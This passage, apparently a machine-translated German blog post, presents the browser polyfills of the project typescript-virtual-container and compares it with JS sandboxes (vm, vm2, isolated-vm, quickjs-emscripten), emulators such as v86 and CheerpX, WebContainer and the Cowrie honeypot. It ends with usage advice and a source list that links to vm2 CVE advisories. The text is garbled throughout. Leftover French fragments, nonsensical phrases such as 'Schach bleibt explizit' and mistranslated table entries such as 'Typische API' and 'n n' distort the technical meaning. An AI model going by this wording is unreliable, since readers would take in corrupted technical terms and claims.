    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```
Ohne Wasm, ohne externe Polyfill-Bibliothek, ohne Rückgriff auf`webpack-node-externals`Ich will nur ein paar Module, die wir als Alias und Globale injiziert haben, auf jeden einzelnen aufzählen, weil einige wirklich beeindruckend sind.

** `node:fs`– IndexedDB als gefälschtes Dateisystem**

Das ist mein Lieblings-Polyfill.`node:fs`implementiert die synchrone API Node.js fs (`readFileSync` , `writeFileSync` , `existsSync` , `readdirSync` , `mkdirSync` , `unlinkSync` , `statSync`...) durch zwei Schichten gestützt: eine`Map`in Speicher für Synchronlesungen und IndexedDB für die Persistenz zwischen Seitenaufladungen. Die Schriften gehen sofort in die Map (d.h.`readFileSync`kurz danach`writeFileSync`, und dann werden asynchron im Hintergrund zu IndexedDB geleert.
```js
// Cache synchrone (Chemin → Uint8 Array null) – Vorträge instantanées
const memCache = new Map();

// Alles aus IndexedDB in memCache beim Start vorladen
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```
Deshalb überlebt der VFS-Snapshotston das Nachladen der Seite im Browser – Binär`.vfsb`Ganz wird in IndexedDB über dieses Polyfill geschrieben und zum nächsten Laden gelesen. Ohne Wasm, ohne Server. Nur IndexeddB, das seit 2011 in allen Browsern ist.

** `node:crypto`– SHA-256 in reinem JS**

Statt eine Kryptobibliothek zu importieren, setzt der Polyfill Krypton SHA-256 von Null aus mit den FIPS 180-4 Turm-Konstanten. 166 Linien von reinem JS mit vollständiger Unterstützung der Hex/base64/Uint8Array-Ausgänge. Alles in der Bibliothek wird durch diese Bibliothek gehackt – der Abdruck der SSH-Hostschlüssel, die internen Steuersummen, alles. Compact, Null Abhängigkeit, es funktioniert.

** `node:os`– liest die richtige Browser-Hardware**

Diese ist eine schöne Aufmerksamkeit, statt die fiktiven Werte in hartem Format zu verschlüsseln,`node:os`Bett`navigator.deviceMemory`für Gesamt-RAM und`navigator.hardwareConcurrency`für die Anzahl der CPUs.`neofetch`im Browser-Build berichtet eigentlich etwas, das deine echte Maschine entspricht – nicht ein blödes stub`2 cœurs, 2 Go de RAM` .
```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 Standard-Go
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // Analysenavigator.userAgentum die Kette des CPU-Modells zu erraten
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```
** `node:net` , `ssh2` , `roxify`– ehrliche Stubs**

Der Browser kann keine TCP Sockets öffnen oder echte SSH ausführen, also sind es Stubs, die einen Fehler starten`NotImplemented`mit einer klaren Botschaft, wenn etwas versucht, sie zu benutzen. Schach bleibt explizit, ohne`undefined`zurück, wo ein Objekt erwartet wird. Nur eine klare und starke Botschaft "Es funktioniert nicht im Browser" – was genau das ist, was du willst.

** `process.js`und`buffer.js`– der injizierten Gesamtmenge**

Diese beiden werden über die Option oben in jede Datei im Bundle eingespritzt.`inject`sbuild, also`process`und`Buffer`sind insgesamt ohne ausdrücklichen Import verfügbar.`process.js`ist klein:`env` , `version` , `platform: 'browser'` , `nextTick`via`queueMicrotask` , `uptime`via`performance.now()` . `buffer.js`ist eine vollständige Neuimplementation von`Buffer`über`Uint8Array`– alle Methoden`readUInt32BE` , `writeInt16LE`, Hex/base64-Kodierungen, deren SSH-Implementierung und VFS-Illementierung abhängig sind.

---

Die Polyfills machen insgesamt 640 Zeilen von JS geschrieben von Hand. Ohne npm-Pakete, ohne Wasm. Und das Ergebnis ist ein Browser-Bund, der nur die Bibliothek ist, nabdisch drehen, ohne irgendeine der üblichen Angst des "aber funktioniert es wirklich im Browseer?" dass du mit den Bibliotheken für Node zuerst entwickelt haben. Es lohnt sich, einen Blick auf den Ordner zu werfen`polyfills/`im Projektarchiv, wenn du neugierig bist - jede Datei ist gut inhaltsam und selbstverständlich, was eine Stilwahl ist, die ich sehr schätze.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | Webcontainer | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategorie** | JS Sandkasten | JS Sandkasten | JS Sandkasten | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Isole der JS** | ^ Reichweite | ✓ V8 Isolat | ✓ Wasm | n/a | n/a | teilweise | n/a | ✓ Worker |
| **Wahrer Linux-Kernel** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell-Interpreter** | ❌ | ❌ | ❌ | ✓ (real) | ✓ (real) | ✓ (real) | teilweise | ✓ (personalisiert) |
| **~170 Unix-Befehle** | ❌ | ❌ | ❌ | ✅ | ✅ | teilweise | ~20 | ✅ |
| **POSIX-Genehmigungen** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | teilweise | ^ angewendet |
| **Benutzerverwaltung** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | n n |
| **Wahrer SSH-Server** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/Audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/Anal VFS** | ❌ | ❌ | ❌ | begrenzt | ❌ | ❌ | ❌ | ✅ |
| **Virtuelles Netz L2/L3** | ❌ | ❌ | ❌ | Grund | ❌ | ❌ | ❌ | n n |
| **virtuelles VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Browser-Unterstützung** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js native** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Typische API** | Grund | ✅ | ✅ | Minimum | ❌ | ✅ | ❌ | n n |
| **Binäre Kompatibilität** | n/a | n/a | n/a | ✅ | ✅ | teilweise | n/a | ❌ |
| **Zeitstart** | sofort | sofort | sofort | 15-40s | 15-40s | 2-5s | sofort | <1s |
| **RAM/instanz** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Runtime-Abhängigkeit** | 0 | 1 (nativ) | 1 (Wasm) | 0 | Eigentümer | 1 | Python-Abhängigkeit | 3 (ssh2, ws, flate) |
| **Status** | stabil | ■ Aktiv | ■ Aktiv | ^ sehr aktiv | Handel | ■ Aktiv | ■ Aktiv | ■ Aktiv |

---

## Wann was verwenden

**Du musst unzuverlässiges JavaScript ausführen – eine Formel, die von einem Benutzer, einem Plugin, einem Skripthook eingereicht wird.** →`isolated-vm`. Wahre V8 Isolat, strenge Speichergrenzen, explizite Kommunikationsbrücke. Vermeidet`vm2`- Die Liste der CVEs ist nur länger, ernsthaft ist es wie eine neue alle paar Monate.`vm`– das ist kein Sandkasten, bitte.

**Du musst JS isolieren und keine native Erweiterung wollen, oder du brauchst Browser-Kompatibilität.** →`quickjs-emscripten`. Wasm Grenze, ein Modul von etwa 500 KB, arbeitet in Browsern und Node. Langsamer als V8 aber wirklich isoliert.

**Du musst ein echtes Linux-Betriebssystem starten, das nicht mit Binärkompatibilität modifiziert ist.** →`v86`für 32-Bit-Linux oder`container2wasm`Wenn du ein vorhandenes Docker-Bild hast, nimm 150 MB+ RAM und 30 Sekunden Startzeit an, dann ist das der Deal. Wenn du 64-Bit brauchst, schau CheerpX an oder benutze nur einen echten Container-Runtime.

**Du musst ein Linux-Terminal in eine Webanwendung ohne Backend integrieren.** →`v86`(Vollständig, schwer, langsam zu starten) oder Browser-Bund`typescript-virtual-container`(Simulator, leichter, sofortiger Start, einschließlich`startxfce4`für ein komplettes Büro, was cool genug für den Schlag ist).

**Du brauchst interaktive Online-Kodierungs-Tutorials oder eine Browser-IDE.** → WebContainer, wenn du auf das Ökosystem Node.js fokussiert bist. CheerpX, wenn Du einen echten Linux-userspace brauchst.`typescript-virtual-container`wenn du eine leichtere Option mit einer typisierten API willst.

**Du willst TTPs von SSH-Angreifern in großem Maßstab sammeln.** → Cowrie ist der Produktionsstandard, Endpunkt. Dreh dich auf jedem Linux-Server, integriert sich mit allen SIEM, hat jetzt einen LLM-Modus. Benutze einfach Cowries.

**Du willst Daten von honeypot SSH in einer Node.js-Anwendung mit einer programmierbaren API.** →`typescript-virtual-container`Die Befehle laufen wirklich. VFS ist eine echte Datenstruktur, die du sofort erfassen und unterscheiden können. Der Angreifer erhält eine überzeugende interaktive Umgebung und du erhalten strukturierte Auditdaten, ohne Node zu verlassen.

**Du brauchst Shell Automation / IC-Tests ohne Docker.** →`typescript-virtual-container`Startet in weniger als einer Sekunde, sofort vor einem Test, danach Wiederherstellung. Führst du Shell-Befehle mit einer typisierten API aus. Ohne Docker-Dämon, ohne Kernel, ohne VM, ohne Wartezeiten.

**Du brauchst multi-lokatarische Shell-Umgebungen (SaaS, allgemeine und berufliche Bildung).** →`typescript-virtual-container`. 5-20 MB pro Instanz vs. 150-256 MB für einen Emulator. 100 gleichzeitige Benutzer: ~2 GB vs ~25 GB. Das ist ein großer Unterschied bei den Unterkunftskosten!

**Du brauchst einen realistischen Honeypot, der dir auch den Aufbau eines Multi-VM-Netzwerklabors ermöglicht.** →`typescript-virtual-container`ist das einzige, was in diesem Raum, der beides macht.

---

## Was er nicht tun kann (und ich will ehrlich darüber sein)

Es kann keine nativen x86 Binärs ausführen. Wenn du C-Code kompilieren, einen echten Python-Interpreter ausführen oder eine Linux-kompilierte Software verwenden müssen, gibt es keinen Kernel-ABI, um diese Systemanrufe zu unterstützen.`gcc` , `python3`und`node`sind Stubs – sie antworten auf`–version`und auf die häufigen Anrufe, aber nicht wirklich ausführen.

Das ist der grundlegende Kompromiss: Du gewinnst 10 bis 50 Mal weniger Speicher, einen sofortigen Start, Browser-Kompatibilität, eine typisierte API, echte SSH und virtuelles Netzwerk - und du kündigst die Binärkompatibilität mit dem userspace Linux.

Fortune hat sich das bei der Planung des Projekts sehr gut überlegt. Für die Anwendungsfälle, die es in Angriff nahm - Honeypots, Tests, eingebettete Terminals, CI-Umgebungen - ist es in Wirklichkeit nie notwendig, ein kompiliertes Binärprogramm zu starten. Shell-Pipelines, Dateimanipulation, Netzwerkrouting und SSH decken alles ab. Aber wenn dein Anwendungsfall eine echte Software erfordert,`v86`Oder Docker ist die richtige Antwort, nicht das.

---

## Zum Abschluss

Das Ökosystem ist größer und fragmentierter als von außen.`vm`ist ein Reichweitentrenner, kein Sandkasten.`vm2`akkumuliert weiterhin CVE (im Grunde betrachtet die Meinungen dieses Monats).`isolated-vm`ist die richtige Antwort für JS-Isolierung, aber nur JS.`quickjs-emscripten`ist die richtige Wahl, wenn du Browser-Kompatibilität benötigen oder native Erweiterungen vermeiden möchten.`v86`und CheerpX sind echte Emulatoren, wenn du echte Binärkompatibilität benötigen. WebContainer ist Node.js in Wasm, nicht eine allgemeine Linux-Umgebung. Cowrie ist der Goldstandard der SSH Honeypots, aber es ist Python und nicht native Node-Honeypot.

Und dann gibt es`typescript-virtual-container`– das Projekt von Fortune – die ein wenig in seiner eigenen Kategorie lebt. Weder Emulator, JS Sandkasten, noch passive Honeypot. Etwas zwischen allen, das sich für viele Dinge, die keiner der anderen tun kann, als erstaunlich nützlich erwiesen hat.

`typescript-virtual-container`schließt die Lücke, die keiner der anderen berührt: eine komplette und programmierbare Linux-Shell-Umgebung mit echtem SSH, SFTP, POSIX-Berechtigungen, Benutzerverwaltung, virtuelles Netzwerk und Typische Typische API-API – in etwa 10 MB drehend, in weniger als einer Sekunde startend, sowohl in Node.js als auch im Browser arbeitend.

Wenn du es versuchen willst: der Quellcode ist auf [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)und es gibt eine Demo online (einschließlich`startxfce4`für ein komplettes Büro, was ist wirklich krank) über [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)Geh und überlasse Fortune ein paar Sterne auf GitHub. du verdient sie!

Danke, dass du das gelesen hast – das war eine lange Zeit für meine Standards:) Ich hoffe, es war dir nützlich!

---

## Quellen

Ich habe versucht, jede Aussage an eine primäre Quelle zu binden – CVE-Stellungnahmen, offizielle Doku-Dokumente, GitHub-Einträge, Blog-Artikel der Betreuer. Einige Anmerkungen: Die Liste der vm2-CVEs verlängert sich weiter, so dass der FortiGuard-Link zu dem Zeitpunkt veraltet sein könnte, als du dieses liest (GitHobseite der GitHub-Bewertungen für die neuesten lesen wirst). Die Bellard-Verlinkungen sind alle stabil – seine persönliche Website ist schon immer da und der Inhalt ändert sich nicht. Und wenn du eines der Polyfills vertiefen möchtest, dann schau einfach den Ordner durch.`polyfills/`in der Hinterlegung`typescript-virtual-container`direkt – es ist lesbarer als jede Beschreibung, die ich hier schreiben könnte.

### JavaScript Sandkasten

- **Modul`vm`Node.js** – offizielle Dokumentation:[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Sicherheitshinweis`vm`von Node.js** – "Vm-Modul ist kein Sicherheitsmechanismus. Verwendest du es nicht, um unzuverlässigen Code auszuführen":[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- ** `vm2`** – npm:[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2)· GitHub:[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Chronologie der CVE vm2** – FortiGuard-Alarm mit der vollständigen Liste der CFE und Daten:[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** – versehentliche Flucht async, GHSA:[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- *CVE-2023-32314** – Proxy + Error.name + Funktionsaustritt, Inhalt PoC:[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** – Eintritt DB-Exploit mit PoC complet:[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** – 11 neue Fluchten, Analyse:[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956)· BleepingComputer:[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** – Post-mortem d'oxeye.io auf CVE-2022-36067:[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- ** `isolated-vm`** – npm:[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm)· GitHub:[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internes V8 Isolat** – Integrationsleitfaden:[v8.dev/docs/embed](https://v8.dev/docs/embed)
- ** `quickjs-emscripten`** – npm:[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)· GitHub:[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- ** `@sebastianwessel/quickjs`** – npm:[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)· GitHub:[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motor QuickJS** – von Fabrice Bellard:[bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modell der Deno-Berechtigungen** – docs:[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Sortie Deno 2** – Oktober 2024:[deno.com/blog/v2](https://deno.com/blog/v2)
- **Vorschlag TC39 ShadowRealm** –[github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Vorschlag TC39 Compartments** –[github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** – Praktischer Artikel von Andrew Healey über den Deno Sandkasten Ansatz:[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux-Emulatoren

- ** `v86`** – npm:[npmjs.com/package/v86](https://www.npmjs.com/package/v86)· GitHub:[github.com/copy/v86](https://github.com/copy/v86)· Demo:[copy.sh/v86](https://copy.sh/v86)
- **Unterstützungs-Maßstab OS v86** –[github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS wird von v86 verwendet) –[seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs-VBE-Erweiterungen** (VGA-Referenz) –[bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** – Bellard-Emulator:[bellard.org/jslinux](https://bellard.org/jslinux/)· Technische Anmerkungen (TinyEMU, Historie, asm.js→Wasm):[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** – Quelle C:[bellard.org/tinyemu](https://bellard.org/tinyemu/)· Inoffizielle GitHub-Spiegel:[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** – JS OpenRISC Emulator:[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k)· Demo:[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** – docs:[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)· Leitfaden für die Pthreads:[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainer** – npm:[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)· API-Dokumente:[webcontainers.io](https://webcontainers.io)· Ankündigung:[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/)· Vorschau InfoQ:[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** – GitHub:[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)· NTT-Blog-Artikel:[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a)· Artikel von Simon Willison:[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** – npm:[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)· GitHub:[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)· Website:[xtermjs.org](https://xtermjs.org)
- **node-pty** – npm:[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty)· GitHub (Microsoft):[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** – GitHub:[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie)· Dokumente:[docs.cowrie.org](https://docs.cowrie.org)· Website:[cowrie.org](https://www.cowrie.org/)
- **Kippo** – GitHub (archiviert):[github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** – GitHub:[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** – GitHub:[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** – Docker Hub:[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **Node-ssh-honeypot** – Honeypots SSH Node.js Minimum:[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** – Organisierte Liste:[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** – Systeminformationen (wie Angreifer Honeypots identifizieren):[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**:[npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**:[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Online-Demo**:[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Architekturleitfaden**:[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- ** `ssh2`** (Implementierung des SSH-Protokolls) – npm:[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2)· GitHub:[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- ** `fflate`** (VFS-Schnappschüsse komprimieren) – npm:[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- ** `ws`** (transport shell WebSocket) – npm:[npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Zusätzliche Lesungen

- **Modell der POSIX-Berechtigung** – Spezifikation Open Group:[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (Bad bei VFS-Persistenz) –[en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modell V8 Isolat** – "Embedder's Guide":[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Spezifikation ISA RISC-V** (für den Kontext TinyEMU/JSLinux) –[riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000-Architektur** –[opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** – Simon Willison TIL, nützlicher Kontrast zum Wasm-Ansatz:[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** – Simon Willison TIL über die Größe des quickjs-emscripten Bundes:[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
